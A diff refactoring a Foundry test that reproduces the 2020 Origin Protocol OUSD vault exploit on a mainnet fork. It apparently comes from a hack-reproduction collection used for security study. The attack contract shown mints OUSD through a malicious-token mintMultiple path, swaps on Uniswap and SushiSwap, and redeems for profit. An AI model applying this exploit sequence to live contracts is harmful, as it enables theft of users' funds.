@@ -2,16 +2,17 @@
 pragma solidity 0.8.25;
 
 // Foundry
-import {Test} from "forge-std/Test.sol";
 import {console} from "forge-std/Console.sol";
 
-// OpenZeppelin
-import {IERC20} from "@openzeppelin/token/ERC20/IERC20.sol";
-
 // Local Interfaces
-import {IWETH} from "src/interfaces/IWETH.sol";
-import {IUSDT} from "src/interfaces/IUSDT.sol";
-import {IUniswapV2Router} from "src/interfaces/IUniswapV2Router.sol";
+import {IOUSDVault} from "src/interfaces/IOUSDVault.sol";
+
+// Local Libraries
+import {Constants} from "src/utils/Constants.sol";
+
+// Base for tests
+import {Contracts} from "src/utils/Contracts.sol";
+import {Base_Test_} from "src/Base.sol";
 
 /**
  * KeyInfo - Total Lost :       5m$
@@ -53,37 +54,43 @@ import {IUniswapV2Router} from "src/interfaces/IUniswapV2Router.sol";
  * 9. The attacker swapped the remaining tokens to ETH and repaid the flashloan.
  * 10. The attacker made a profit of 9k ETH (≈4m$) , 1m DAI (=1m$) and 5m OUSD (worthless).
  */
-contract Hack_OUSD is Test {
-    IWETH public constant WETH = IWETH(payable(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2));
-    IOUSD public constant OUSD = IOUSD(0x2A8e1E676Ec238d8A992307B495b45B3fEAa5e86);
-    IUSDT public constant USDT = IUSDT(0xdAC17F958D2ee523a2206206994597C13D831ec7);
-    IERC20 public constant DAI = IERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F);
-    IERC20 public constant USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
-    IOUSDVault public constant OUSD_VAULT = IOUSDVault(0x277e80f3E14E7fB3fc40A9d6184088e0241034bD);
-    IUniswapV2Router public constant UNISWAP_ROUTER =
-        IUniswapV2Router(payable(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D));
+contract Hack_OUSD is Base_Test_ {
+    //////////////////////////////////////////////////////
+    /// --- CONSTANTS & IMMUTABLES
+    //////////////////////////////////////////////////////
+    uint256 public constant ATTACK_AMOUNT = 70_000 ether;
+    uint256 public constant ATTACK_BLOCK_NUMBER = 11272255;
 
+    address public immutable ATTACKER = makeAddr("Attacker");
+    address public constant OUSD_VAULT_IMPL = 0x328d15F6B5Eba1C30CDe1A5F1f5A9E35b07f5424;
+    IOUSDVault public constant OUSD_VAULT = IOUSDVault(0x277e80f3E14E7fB3fc40A9d6184088e0241034bD);
+
+    //////////////////////////////////////////////////////
+    /// --- ATTACK CONTRACT
+    //////////////////////////////////////////////////////
     Attack_Contract public attackContract;
 
-    uint256 public constant MAX_UINT256 = type(uint256).max;
-    uint256 public constant ATTACK_BLOCK_NUMBER = 11272255;
-    uint256 public constant ATTACK_AMOUNT = 70_000 ether;
-    address public immutable ATTACKER = makeAddr("Attacker");
+    //////////////////////////////////////////////////////
+    /// --- SETUP
+    //////////////////////////////////////////////////////
+    function setUp() public override {
+        super.setUp();
 
-    function setUp() public {
+        // Create a fork of the mainnet
         vm.createSelectFork(vm.envString("PROVIDER_URL_MAINNET"), ATTACK_BLOCK_NUMBER - 1);
-        vm.label(address(WETH), "WETH");
-        vm.label(address(DAI), "DAI");
-        vm.label(address(USDC), "USDC");
-        vm.label(address(USDT), "USDT");
-        vm.label(address(UNISWAP_ROUTER), "UNISWAP_ROUTER");
-        vm.label(address(OUSD), "OUSD");
-        vm.label(address(OUSD_VAULT), "OUSD_VAULT");
-        vm.label(0x328d15F6B5Eba1C30CDe1A5F1f5A9E35b07f5424, "OUSD_VAULT_IMPL");
+
+        // Deploy the attack contract
         attackContract = new Attack_Contract();
+
+        // Label remaining contracts
+        vm.label(address(OUSD_VAULT), "OUSD_VAULT");
+        vm.label(OUSD_VAULT_IMPL, "OUSD_VAULT_IMPL");
         vm.label(address(attackContract), "ATTACK_CONTRACT");
     }
 
+    //////////////////////////////////////////////////////
+    /// --- TEST_HACK
+    //////////////////////////////////////////////////////
     function test_OriginProtocol_Attack_2020_11_17() public {
         // Simulate flashloan
         deal(address(WETH), address(attackContract), ATTACK_AMOUNT);
@@ -93,12 +100,8 @@ contract Hack_OUSD is Test {
         attackContract.attack();
         vm.stopPrank();
 
-        // Console all balances
+        // Console all balances after attack
         console.log("\n------ After the attack ------");
-        consoleBalances();
-    }
-
-    function consoleBalances() public view {
         console.log("Balance OUSD attacker: %e", OUSD.balanceOf(address(attackContract)));
         console.log("Balance USDT attacker: %e", USDT.balanceOf(address(attackContract)));
         console.log("Balance USDC attacker: %e", USDC.balanceOf(address(attackContract)));
@@ -108,19 +111,12 @@ contract Hack_OUSD is Test {
     }
 }
 
-contract Attack_Contract {
-    IWETH public constant WETH = IWETH(payable(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2));
-    IOUSD public constant OUSD = IOUSD(0x2A8e1E676Ec238d8A992307B495b45B3fEAa5e86);
-    IUSDT public constant USDT = IUSDT(0xdAC17F958D2ee523a2206206994597C13D831ec7);
-    IERC20 public constant DAI = IERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F);
-    IERC20 public constant USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
+////////////////////////////////////////////////////
+/// --- ATTACK CONTRACT
+////////////////////////////////////////////////////
+contract Attack_Contract is Contracts {
     IOUSDVault public constant OUSD_VAULT = IOUSDVault(0x277e80f3E14E7fB3fc40A9d6184088e0241034bD);
-    IUniswapV2Router public constant UNISWAP_ROUTER =
-        IUniswapV2Router(payable(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D));
-    IUniswapV2Router public constant SUSHISWAP_ROUTER =
-        IUniswapV2Router(payable(0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F));
 
-    uint256 public constant MAX_UINT256 = type(uint256).max;
     uint256 public constant ATTACK_AMOUNT = 70_000 ether;
     uint256 public constant ATTACK_BLOCK_NUMBER = 11272255;
 
@@ -147,7 +143,7 @@ contract Attack_Contract {
         OUSD.rebaseOptIn();
 
         // Mint OUSD with USDT (nothing wrong here)
-        USDT.approve(address(OUSD_VAULT), MAX_UINT256);
+        USDT.approve(address(OUSD_VAULT), Constants.MAX_UINT256);
         OUSD_VAULT.mint(address(USDT), 7_500_000 * 1e6);
 
         // Mint multiple OUSD with DAI and malicious token
@@ -157,7 +153,7 @@ contract Attack_Contract {
         uint256[] memory amounts = new uint256[](2);
         amounts[0] = 20_500_000 ether;
         amounts[1] = 0;
-        DAI.approve(address(OUSD_VAULT), MAX_UINT256);
+        DAI.approve(address(OUSD_VAULT), Constants.MAX_UINT256);
         OUSD_VAULT.mintMultiple(path, amounts);
         // --- End of the attack ---
         //emit log_named_uint256("OUSD total supply after mint multiple", OUSD.totalSupply()); // 55,520,199.517441762179098939
@@ -167,35 +163,35 @@ contract Attack_Contract {
         // Swap 300k OUSD to USDT on Uniswap V2
         path[0] = address(OUSD);
         path[1] = address(USDT);
-        OUSD.approve(address(UNISWAP_ROUTER), MAX_UINT256);
+        OUSD.approve(address(UNISWAP_ROUTER), Constants.MAX_UINT256);
         UNISWAP_ROUTER.swapExactTokensForTokens(300_000 ether, 1, path, address(this), block.timestamp + 1);
 
         // Swap 1m OUSD to USDT on ShushiSwap
         path[0] = address(OUSD);
         path[1] = address(USDT);
-        OUSD.approve(address(SUSHISWAP_ROUTER), MAX_UINT256);
+        OUSD.approve(address(SUSHISWAP_ROUTER), Constants.MAX_UINT256);
         SUSHISWAP_ROUTER.swapExactTokensForTokens(1_000_000 ether, 1, path, address(this), block.timestamp + 1);
 
         // Redeem
-        OUSD.approve(address(OUSD_VAULT), MAX_UINT256);
+        OUSD.approve(address(OUSD_VAULT), Constants.MAX_UINT256);
         OUSD_VAULT.redeem(33_269_189_620024494262512727);
 
         // Swap remaining USDT in ETH on Uniswap V2
         path[0] = address(USDT);
         path[1] = address(WETH);
-        USDT.approve(address(UNISWAP_ROUTER), MAX_UINT256);
+        USDT.approve(address(UNISWAP_ROUTER), Constants.MAX_UINT256);
         UNISWAP_ROUTER.swapExactTokensForETH(USDT.balanceOf(address(this)), 1, path, address(this), block.timestamp + 1);
 
         // Swap remaining USDC in ETH on Uniswap V2
         path[0] = address(USDC);
         path[1] = address(WETH);
-        USDC.approve(address(UNISWAP_ROUTER), MAX_UINT256);
+        USDC.approve(address(UNISWAP_ROUTER), Constants.MAX_UINT256);
         UNISWAP_ROUTER.swapExactTokensForETH(USDC.balanceOf(address(this)), 1, path, address(this), block.timestamp + 1);
 
         // Swap remaining DAI in ETH on Uniswap V2
         path[0] = address(DAI);
         path[1] = address(WETH);
-        DAI.approve(address(UNISWAP_ROUTER), MAX_UINT256);
+        DAI.approve(address(UNISWAP_ROUTER), Constants.MAX_UINT256);
         UNISWAP_ROUTER.swapExactTokensForETH(
             DAI.balanceOf(address(this)) - 1_000_000 ether, 1, path, address(this), block.timestamp + 1
         );
@@ -214,15 +210,4 @@ contract Attack_Contract {
         //emit log_named_uint256("OUSD total supply after rebase", OUSD.totalSupply()); //          35,020,199.517441762179098939
         //emit log_named_uint256("OUSD total value after rebase", OUSD_VAULT.totalValue()); //      35,020,199.517441762179098939 -> 20,500,000 DAI are considered as benefice from the vault.
     }
-}
-
-interface IOUSD is IERC20 {
-    function rebaseOptIn() external;
-}
-
-interface IOUSDVault {
-    function mint(address asset, uint256 amount) external;
-    function redeem(uint256 amount) external;
-    function mintMultiple(address[] calldata assets, uint256[] calldata amounts) external;
-    function totalValue() external view returns (uint256);
 }
